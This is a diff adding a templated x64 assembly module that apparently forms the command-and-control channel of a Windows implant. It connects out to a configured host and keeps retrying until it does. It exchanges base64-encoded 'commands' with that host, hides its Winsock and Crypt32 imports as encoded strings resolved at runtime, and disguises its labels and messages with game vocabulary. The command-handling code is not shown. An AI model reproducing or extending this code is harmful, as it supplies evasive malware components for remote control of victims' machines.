@@ -1,0 +1,560 @@
+#!name##TCP_module1
+#!types##sfile
+#!info##Assembler TCP Socket module
+
+
+{% set PFL_base = TOOL.AsmSh_make_table(data=PF_text, set_as_default=True)%}
+
+
+extern printf
+
+extern GetLastError
+
+
+
+extern PITF_Init
+extern PITF_get
+extern PITF_show_item
+
+%define TCP_SOCKET_CONNECTION_PAUSE 3000
+%define TCP_SOCKET_MSG_WAITALL 0x0008
+%define TCP_SOCKET_NO_FLAG 0
+%define CHAMELEON_DEC_BUFF_LEN 2048
+
+
+section .data
+    text_out_s: db "OUT: %s", 10, 0
+    mtcp_text_error: db "[!!] SE: %d [!!]", 10, 0
+    mtcp_text_init: db "SDinit", 10, 0
+    mtcp_text_try_conn: db "T %s:%d", 10, 0
+    mtcp_text_sock_build: db "Sbs", 10, 0
+    mtcp_text_connect: db "CHOST", 10, 0
+    mtcp_text_error_con: db "[!!] E [!!]", 10, 0
+    mtcp_text_sock_close: db "Closed Level", 10, 0
+    mtcp_text_error_lost: db "[!!]Lose Life [!!]", 10, 0
+    
+    mtcp_item_player: dd {{TOOL.AsmSh_encode("ws2_32.dll")}}  ; ws2_32.dll
+    mtcp_item_ena: dd {{TOOL.AsmSh_encode("WSAStartup")}}   ; WSAStartup
+    mtcp_item_so: dd {{TOOL.AsmSh_encode("socket")}} ; socket
+    mtcp_item_co: dd {{TOOL.AsmSh_encode("connect")}} ; connect
+    mtcp_item_rc: dd {{TOOL.AsmSh_encode("recv")}}  ; recv
+    mtcp_item_sd: dd {{TOOL.AsmSh_encode("send")}}  ; send
+    mtcp_item_cs: dd {{TOOL.AsmSh_encode("closesocket")}}  ; closesocket
+    mtcp_item_ht: dd {{TOOL.AsmSh_encode("htons")}} ; htons
+    mtcp_item_ia: dd {{TOOL.AsmSh_encode("inet_addr")}}  ; inet_addr
+    mtcp_item_sl: dd {{TOOL.AsmSh_encode("Sleep")}} ; Sleep
+    mtcp_ch_enemy: dd {{TOOL.AsmSh_encode("Crypt32.dll")}} ; Crypt32.dll
+    mtcp_ch_sb: dd {{TOOL.AsmSh_encode("CryptStringToBinaryA")}} ; CryptStringToBinaryA
+    mtcp_ch_bs: dd {{TOOL.AsmSh_encode("CryptBinaryToStringA")}} ; CryptBinaryToStringA
+
+{% set _ = TOOL.AsmSh_reset_table() %}
+
+section .bss
+    mtcp_ws_struct: resb 400   ; wsa data struct
+    mtcp_socket_fd: resq 1   ; socket file descriptor
+    mtcp_struct_addr: resb 16  ; sock_addr struct 16 bytes
+    mtcp_is_conn: resb 1    ; is connection FLAG
+    mtcp_pl_home: resb 16   ; ip addr buffer
+    mtcp_pl_home2: resq 1   ; port number
+    mtcp_pl_wait: resq 1    ; Sleep func addr
+    cham_dec_buff: resb CHAMELEON_DEC_BUFF_LEN  ; buffer for decoded cmd
+    cham_dec_buff_len: resd 1    ; buffer for len buffer
+    cham_enc_buff: resb CHAMELEON_DEC_BUFF_LEN ; buffer for encoded cmd
+    cham_enc_buff_len: resd 1   ; buffer for len buffer
+    cham_buff_count: resd 1 ; buffer for text counter
+    
+
+section .text
+
+TCP_Init:
+; Initialize module
+; IN: rcx - encoded host ip
+; IN: rdx - port number
+; OUT: rax - '1' build and connect successfull, '0' - False
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rcx    ; encoded host ip
+    mov [rbp-16], rdx   ; port num
+    
+    lea rax, [mtcp_pl_home2]
+    mov qword [rax], rdx    ; save port num
+    
+    sub rsp, 40
+    call PITF_show_item
+    add rsp, 40
+    
+    ;copy decoded ip addr
+    mov rsi, rax    ; source
+    lea rdi, [mtcp_pl_home] ; destination
+    mov rcx, 16 ;   number of bytes
+    cld ; direction flag
+    rep movsb   ; copy bytes
+    
+    ; get Sleep func
+    sub rsp, 40
+    mov rcx, mtcp_item_sl
+    mov rdx, 0
+    call PITF_get
+    add rsp, 40
+    lea rcx, [mtcp_pl_wait]
+    mov [rcx], rax  ; save func addr
+    
+    ; init socket dll
+    sub rsp, 40
+    call SOCKET_dll_init
+    add rsp, 40
+    cmp rax, 0
+    je .return_false
+    
+    ; build and connect loop
+    sub rsp, 40
+    lea rcx, [mtcp_pl_home]
+    mov rdx, [rbp-16]
+    call SOCKET_build
+    add rsp, 40
+    
+    
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+
+    .return_false:
+        xor rax, rax
+        jmp .return
+
+TCP_CHAM_decode:
+; decode command base64
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - pointer to command
+; OUT: rax - pointer to decoded command, '0' - False
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rcx    ; command
+    
+    ;clear buffer
+    xor rbx, rbx    ; counter
+    lea rdx, [cham_dec_buff]
+    .clear_buff:
+        cmp rbx, CHAMELEON_DEC_BUFF_LEN
+        je .clear_end
+        mov byte [rdx+rbx], 0
+        inc rbx
+        jmp .clear_buff
+        
+    .clear_end:
+        xor rax, rax
+    
+    sub rsp, 40
+    
+    mov rcx, mtcp_ch_sb
+    mov rdx, mtcp_ch_enemy
+    call PITF_get
+    add rsp, 40
+    mov rbx, rax
+    
+    sub rsp, 76
+    mov rcx, [rbp-8]
+    mov rdx, 0
+    mov r8, 1
+    lea r9, [cham_dec_buff]
+    lea rax, [cham_dec_buff_len]
+    mov dword [rax], CHAMELEON_DEC_BUFF_LEN
+    mov qword [rsp+32], rax
+    mov qword [rsp+40], 0
+    mov qword [rsp+48], 0
+    call rbx ; call CryptStringToBinaryA
+    add rsp, 76
+    cmp rax, 0
+    je .error   
+    lea rax, [cham_dec_buff]
+    
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+    .error:
+        xor rax, rax
+        jmp .return
+
+
+
+TCP_CHAM_encode:
+; encode command base64
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - pointer to command
+; OUT: rax - pointer to encoded command, '0' - False
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rcx    ; pointer to command
+    
+    ; get func addr
+    sub rsp, 40
+    mov rcx, mtcp_ch_bs
+    mov rdx, mtcp_ch_enemy
+    call PITF_get
+    add rsp, 40
+    
+    mov [rbp-16], rax   ; save func addr
+    mov rcx, [rbp-8]
+    
+    ; clear buffer
+    xor rbx, rbx    ; counter
+    lea rdx, [cham_enc_buff]
+    .clear_buff:
+        cmp rbx, CHAMELEON_DEC_BUFF_LEN
+        je .clear_end
+        mov byte [rdx + rbx], 0
+        inc rbx
+        jmp .clear_buff
+    .clear_end:
+        xor rax, rax
+    
+    ; text length calculation
+    xor rbx, rbx    ; counter
+    xor rdx, rdx    ; temp
+    .length_loop:
+        mov byte dl, [rcx + rbx]
+        cmp dl, 0
+        je .length_end
+        inc rbx
+        jmp .length_loop
+    
+    .length_end:
+        lea rax, [cham_buff_count]
+        mov [rax], rbx
+    
+    .encode:
+        sub rsp, 56
+        mov rcx, [rbp-8]
+        mov rdx, rbx
+        mov r8, 1
+        lea r9, [cham_enc_buff]
+        lea rax, cham_enc_buff_len
+        mov dword [rax], CHAMELEON_DEC_BUFF_LEN
+        mov qword [rsp+32], rax
+        mov rax, [rbp-16]
+        call rax    ; call CryptBinaryToStringA
+        add rsp, 56            
+        lea rax, [cham_enc_buff]
+    
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+        
+TCP_send:
+; encode and send messages
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - pointer to buffer
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rcx    ; save buffer pointer
+    
+    sub rsp, 40
+    call TCP_CHAM_encode
+    add rsp, 40
+    
+    mov rcx, rax    ; move encoded msg
+    
+    ;calc length
+    xor rax, rax
+    xor rbx, rbx    ; counter
+    .calc_len:
+        mov byte al, [rcx + rbx]
+        cmp al, 0
+        je .calc_len_end
+        inc rbx
+        jmp .calc_len
+    .calc_len_end:
+        xor rax, rax
+    ; send msg
+    .send_msg:
+        sub rsp, 40
+        mov r15, rcx    ; save rcx
+        mov rcx, mtcp_item_sd
+        mov rdx, mtcp_item_player
+        call PITF_get
+        mov rdx, r15
+        lea rcx, [mtcp_socket_fd]
+        mov rcx, [rcx]
+        mov r8, rbx
+        mov r9, 0
+        call rax    ; call send
+        add rsp, 40
+
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+
+TCP_recv:
+;recive and decode message from socket
+; REQUIREMENTS: stack allign to 16
+; IN, OUT: rcx - pointer to buffer
+; IN: rdx - buffer length
+; OUT: rax - '0' - connection lost, '1' - data recived
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rcx    ; save buffer pointer
+    mov [rbp-16], rdx   ; save buffer length
+    
+    sub rsp, 40
+    call SOCKET_recive
+    add rsp, 40
+    cmp rax, 0
+    je .return
+    
+    sub rsp, 40
+    mov rcx, [rbp-8]
+    call TCP_CHAM_decode
+    add rsp, 40
+
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+
+
+SOCKET_recive:
+; Start recive messages
+; REQUIREMENTS: stack allign to 16
+; IN, OUT: rcx - pointer to buffer
+; IN: rdx - buffer length
+; OUT: rax - '0' - connection lost, '1' - data recived
+    push rbp
+    mov rbp, rsp
+    sub rsp, 40 ; space for variable and allign
+    mov [rbp-8], rcx    ; save buffer pointer
+    mov [rbp-16], rdx   ; save buffer length
+    
+    ; check 'is_connected' FLAG
+    lea rcx, [mtcp_is_conn]
+    mov rcx, [rcx]
+    cmp rcx, 0
+    je .error
+    
+    ;start recive
+    .recive:
+        sub rsp, 40
+        mov rcx, mtcp_item_rc
+        mov rdx, mtcp_item_player
+        call PITF_get
+        lea rcx, [mtcp_socket_fd]
+        mov rcx, [rcx]
+        mov rdx, [rbp-8]
+        mov r8, [rbp-16]
+        mov r9, 0
+        call rax    ; call recive
+        add rsp, 40
+        cmp rax, 0
+        je .error
+    
+    .check_null:
+        mov rdx, [rbp-8]
+        xor rcx, rcx
+        mov cl, [rdx]
+        cmp cl, 0
+        je .error
+        mov rax, 1  ; True FLAG
+    
+    
+    .return:
+        add rsp, 40 ; restore stack
+        pop rbp
+        ret
+    
+    .error:
+        sub rsp, 40
+        mov rcx, mtcp_text_error_lost
+        call printf
+        add rsp, 40
+        xor rax, rax    ; False FLAG
+        jmp .return
+
+
+SOCKET_close:
+; close socket
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    
+    sub rsp, 40
+    mov rcx, mtcp_item_cs
+    mov rdx, mtcp_item_player
+    call PITF_get
+    lea rcx, [mtcp_socket_fd]
+    mov rcx, [rcx]
+    call rax    ; call closesocket
+    mov rcx, mtcp_text_sock_close
+    call printf
+    add rsp, 40
+    
+    ; reset 'is_connected' FLAG
+    lea rcx, [mtcp_is_conn]
+    mov byte [rcx], 0
+    
+    
+    add rsp, 8
+    pop rbp
+    ret
+
+
+
+SOCKET_build:
+; Build socket and connect to host
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - IP address
+; IN: rdx - PORT number
+; OUT: rax - '1' build and connect successfull, '0' - False
+
+    push rbp
+    mov rbp, rsp
+    sub rsp, 40 ; space for variables and allign to 16
+    mov [rbp-8], rcx    ; save ip addr
+    mov [rbp-16], rdx   ; save port number
+        
+    
+    ;create socket
+    .create:
+        sub rsp, 40 ;shadow space
+        mov rcx, mtcp_item_so
+        mov rdx, mtcp_item_player
+        call PITF_get
+        mov rcx, 2  ;AF_INET    ;The address family specification.
+        mov rdx, 1  ;SOCK_STREAM    ; The type specification for the new socket.
+        mov r8, 6   ; IPPROTO_TCP ;The protocol to be used.
+        call rax    ; call socket
+        add rsp, 40 ;restore stack
+        cmp rax, -1
+        je .error
+        lea rcx, [mtcp_socket_fd]
+        mov [rcx], rax  ; save socket fd
+        sub rsp, 40
+        mov rcx, mtcp_text_sock_build
+        call printf
+        add rsp, 40
+    
+    .config_sock:
+        ;   struct sockaddr_in {
+        ;       short   sin_family; 2 bytes
+        ;       u_short sin_port;   2 bytes
+        ;       struct  in_addr sin_addr; 4 bytes
+        ;       char    sin_zero[8];
+        ;      };
+        
+        ; SIN_FAMILY
+        lea rcx, [mtcp_struct_addr]
+        mov qword [rcx], 2  ;AF_INET
+        
+        ; SIN_PORT
+        sub rsp, 40 ;shadow space
+        mov rcx, mtcp_item_ht
+        mov rdx, mtcp_item_player
+        call PITF_get
+        mov rcx, [rbp-16]
+        call rax    ; call htons
+        lea rcx, [mtcp_struct_addr]
+        mov [rcx + 2], rax  ; save sin_port to struct
+        
+        ; IP ADDR
+        mov rcx, mtcp_item_ia
+        mov rdx, mtcp_item_player
+        call PITF_get
+        mov rcx, [rbp-8]
+        call rax    ; call inet_addr
+        lea rcx, [mtcp_struct_addr]
+        mov [rcx+4], rax    ; save ip addr to struct
+        add rsp, 40 ;restore stack
+    
+    .connect:
+    ; reset 'is connected' FLAG
+        lea rcx, [mtcp_is_conn]
+        mov byte [rcx], 0
+        
+        sub rsp, 40 ;shadow space
+        mov rcx, mtcp_text_try_conn
+        mov rdx, [rbp-8]
+        mov r8, [rbp-16]
+        call printf
+        
+        ; try connect
+        mov rcx, mtcp_item_co
+        mov rdx, mtcp_item_player
+        call PITF_get
+        lea rcx, [mtcp_socket_fd]
+        mov rcx, [rcx]
+        lea rdx, [mtcp_struct_addr]
+        mov r8, 16  ; length sock_addr struct
+        call rax    ; call connect
+        add rsp, 40 ; restore stack
+        cmp rax, 0
+        jne .error_conn
+            
+        sub rsp, 40
+        mov rcx, mtcp_text_connect
+        call printf
+        add rsp, 40
+        ; set 'is connected' FLAG
+        lea rcx, [mtcp_is_conn]
+        mov byte [rcx], 1
+        mov rax, 1  ;return True
+
+    .return:
+        add rsp, 40 ; restore stack from prolog
+        pop rbp
+        ret
+    
+    .error:
+        xor rax, rax    ; return 0
+        jmp .return
+
+    .error_conn:
+        sub rsp, 40
+        mov rcx, mtcp_text_error_con
+        call printf
+        mov rcx, TCP_SOCKET_CONNECTION_PAUSE
+        lea rax, [mtcp_pl_wait]
+        mov rax, [rax]
+        call rax    ; call Sleep
+        ;call Sleep
+        add rsp, 40
+        jmp .connect
+
+SOCKET_dll_init:
+; REQUIREMENTS: stack allign to 16
+; OUT: rax - '0' False, '1' True
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 48 ;shadow space
+    mov rcx, mtcp_item_ena
+    mov rdx, mtcp_item_player
+    call PITF_get 
+    mov rcx, 0x0202 ; wVersionRequired
+    lea rdx, [mtcp_ws_struct]
+    call rax    ; call WSAStartup
+    cmp rax, 0
+    jne .error
+    mov rcx, mtcp_text_init
+    call printf
+    mov rax, 1  ; return 1
+    
+    .return:
+        add rsp, 48 ; restore stack
+        pop rbp
+        ret
+    
+    .error:
+        call GetLastError
+        mov rcx, mtcp_text_error
+        mov rdx, rax
+        call printf
+        xor rax, rax    ; return 0
+        jmp .return
